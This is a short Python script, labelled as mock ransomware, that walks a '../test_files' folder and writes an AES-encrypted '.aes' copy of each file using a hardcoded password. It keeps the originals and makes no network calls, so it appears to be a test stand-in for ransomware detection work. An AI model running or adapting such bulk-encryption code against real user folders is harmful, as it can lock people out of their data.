import os
import pyAesCrypt
import shutil

# This class of mock ransomware does following:
# 1 - Iterate through all files of specified folder
# 2 - Copy content of found file into a new file with same name
#   but different extension, in this case .aes
# 3 - Encrypt newly created copy of the file
def main():
  bufferSize = 64 * 1024
  password = "foopassword"
  test_file_dir_path = "../test_files"
  for root, dirs, files in os.walk(test_file_dir_path):
    for file in files:
      source_file = test_file_dir_path + "/" + file
      file_extension = os.path.splitext(file)[1]
      destination_file = test_file_dir_path + "/" + file.replace(file_extension, "") + ".aes"
      pyAesCrypt.encryptFile(source_file, destination_file, password, bufferSize)

if __name__== "__main__":
  main()